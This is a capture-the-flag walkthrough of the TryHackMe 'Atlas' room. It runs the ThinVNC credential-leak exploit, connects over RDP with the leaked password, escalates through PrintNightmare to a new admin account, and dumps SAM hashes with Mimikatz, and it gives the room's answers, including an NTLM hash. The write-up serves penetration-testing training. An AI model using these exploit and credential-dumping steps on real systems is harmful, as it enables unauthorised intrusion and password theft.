---
description: https://tryhackme.com/room/atlas
---

# Atlas

## Enumeration

### Task 2 Port Scanning

#### Scan your target IP with Nmap! With the Nmap default port range, you should find that two ports are open. What port numbers are these?

```bash
nmap -n -sn 10.10.31.250
```

![](<../../.gitbook/assets/Screenshot from 2022-02-27 14-28-45.png>)

{% hint style="success" %}
3389, 8080
{% endhint %}

#### What service does Nmap think is running on the higher of the two ports?

{% hint style="success" %}
`http-proxy`
{% endhint %}

### Task 3 Service Enumeration

```bash
nmap -n -Pn -p3389,8080 -sV 10.10.31.250
```

![](<../../.gitbook/assets/Screenshot from 2022-02-27 14-38-00.png>)

```bash
curl -v http://10.10.31.250:8080
```

![](<../../.gitbook/assets/Screenshot from 2022-02-27 14-39-41.png>)

#### Use searchsploit to find the vulnerability in ThinVNC

```bash
searcploit ThinVNC
```

![](<../../.gitbook/assets/Screenshot from 2022-02-27 14-41-20.png>)

## Attack

### Task 4 Foothold

```bash
searchsploit -m 47519
python3 47519.py 10.10.31.250 8080
```

![](<../../.gitbook/assets/Screenshot from 2022-02-27 14-46-39.png>)

#### _Clone_ the Git repository at [https://github.com/MuirlandOracle/CVE-2019-17662](https://github.com/MuirlandOracle/CVE-2019-17662)  to your attacking machine.

#### This script _requires_ two arguments. Ascertain what these arguments are, then use the script to exploit the vulnerable service on the target.

```bash
git clone https://github.com/MuirlandOracle/CVE-2019-17662
cd CVE-2019-17662
python3 CVE-2019-17662.py 10.10.31.250 8080
```

![](<../../.gitbook/assets/Screenshot from 2022-02-27 14-54-24.png>)

#### Use the credentials found by the script to get past the HTTP Basic Auth presented when trying to access the vulnerable service in your web browser. You should have access to a user desktop!

![http://10.10.31.250:8080/](<../../.gitbook/assets/Screenshot from 2022-02-27 14-59-44.png>)

![](<../../.gitbook/assets/Screenshot from 2022-02-27 14-59-50.png>)

## Access

### Task 5 VNC / RDP

#### Most people take the easy option when it comes to passwords, which makes password reuse incredibly common. With that in mind, use `xfreerdp` to connect to the target over RDP.

```bash
xfreerdp /v:10.10.31.250 /u:Atlas /p:H0ldUpTheHe@vens /cert-ignore \                                  
         +clipboard /dynamic-resolution /drive:share,/tmp
```

![](<../../.gitbook/assets/Screenshot from 2022-02-27 15-12-07.png>)

## Attack

### Task 6 Privilege Escalation

#### There are many different implementations of PrintNightmare available. You are advised to use a [PowerShell version](https://github.com/calebstewart/CVE-2021-1675) written by [Caleb Stewart](https://twitter.com/calebjstewart) and [John Hammond](https://twitter.com/\_JohnHammond).

```bash
git clone https://github.com/calebstewart/CVE-2021-1675.git /tmp/CVE-2021-1675
```

#### Inside your RDP session, open a new PowerShell Window. The repository that we downloaded contains a PowerShell script that needs to be imported.

```bash
PS> . \\tsclient\share\CVE-2021-1675\CVE-2021-1675.ps1
```

#### This uses dot-syntax to import any functions exposed by the script. We are using `\\tsclient\share` to reference the share that we created. This allows us to view files that are stored in the /tmp folder of our own attacking machine!

#### Only one thing left to do: run the exploit!

```bash
Invoke-Nightmare
```

![](<../../.gitbook/assets/Screenshot from 2022-02-27 15-44-12.png>)

#### Notice that our payload mentions creating a new user called `adm1n` with a password of `P@ssw0rd`? This is the default behaviour when using this exploit; however, we could have created our own payload and substituted that in should we have preferred another method of exploitation.

#### Regardless, we can now make use of our brand new admin account! We could take the simple option of right-clicking on PowerShell or cmd.exe and choosing to "Run as Administrator", but that's no fun. Instead, let's use a hacky little PowerShell command to start a new high-integrity command prompt running as our new administrator.

```bash
Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n
```

![](<../../.gitbook/assets/Screenshot from 2022-02-27 15-48-31.png>)

#### Run the command `whoami /groups` in the new window. You should see `BUILTIN\Administrators` in the list of groups, and a line at the bottom of the output containing `Mandatory Label\High Mandatory Level`.

```bash
whoami /groups
```

![](<../../.gitbook/assets/Screenshot from 2022-02-27 15-49-41.png>)

#### These mean that you are running as an administrator with full access over the machine.

### Task 7 Post Exploitation

#### First up, let's get an up-to-date copy of Mimikatz to our attacking machine. The code for the tool is publicly available on Github, but fortunately for the sake of simplicity, there are also pre-compiled versions available for download.

#### Go to the [releases page](https://github.com/gentilkiwi/mimikatz/releases) for Mimikatz and find the latest release at the top of the list. Download the file called `mimikatz_trunk.zip` to your attacking machine.

```bash
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip \
     -P /tmp
cd /tmp
unzip mimikatz_trunk.zip
```

![](<../../.gitbook/assets/Screenshot from 2022-02-27 16-03-19.png>)

#### Switch back into your RDP session and execute the following command to start Mimikatz

```bash
\\tsclient\share\x64\mimikatz.exe
```

![](<../../.gitbook/assets/Screenshot from 2022-02-27 16-04-54.png>)

#### When we start Mimikatz we usually have to execute two commands before we start dumping hashes:

* `privilege::debug` -- this obtains debug privileges which allows us to access other processes for "debugging" purposes.
* `token::elevate` -- simply put, this takes us from our administrative shell with high privileges into a `SYSTEM` level shell with maximum privileges. This is something that we have a _right_ to do as an administrator, but that is not usually possible using normal Windows operations.

#### With these commands executed, we are ready to dump some passwords hashes!

![](<../../.gitbook/assets/Screenshot from 2022-02-27 16-09-29.png>)

#### There are a variety of commands we _could_ use here, all of which do slightly different things. The command that we _will_ use is: `lsadump::sam`.

```bash
lsadump::sam
```

![](<../../.gitbook/assets/Screenshot from 2022-02-27 16-10-43.png>)

#### When executed, this will provide us with a list of password hashes for every account on the machine. The Administrator account password hash should be fairly near the top of the list:

#### What is the Administrator account's NTLM password hash?

{% hint style="success" %}
`c16444961f67af7eea7e420b65c8c3eb`
{% endhint %}
